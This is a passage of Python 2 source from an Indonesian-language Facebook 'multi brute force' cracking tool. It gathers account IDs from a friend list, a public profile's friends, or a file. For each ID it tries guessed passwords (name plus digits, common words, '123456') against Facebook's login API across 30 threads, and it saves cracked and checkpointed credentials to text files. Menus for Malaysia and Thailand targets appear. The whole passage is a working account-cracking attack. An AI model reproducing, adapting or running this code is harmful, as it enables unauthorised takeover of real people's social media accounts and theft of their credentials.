											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/malay.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('Malaysia')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/malay.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/malay.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('Anjing')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/malay.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/indo.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('Sayang')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/malay.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/malay.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/malay.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/malay.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone malay.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK THAILAND #####
def crack_thai():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  /|__|   |___  /"
	print "\033[1;91m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mThailand\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_thai()

#### PILIH THAILAND ####
def pilih_thai():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_thai()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK THAILAND \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK THAILAND \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_thai()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK THAILAND \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_thai()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_thai()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN thailand #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/thai.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/thai.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/thai.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/thai.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/thai.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/thai.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('Kraceī́yw')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;9=m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/thai.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/thai.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('lovely')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/thai.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/thai.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/thai.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/thai.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('123456')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/thai.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/thai.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/thai.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
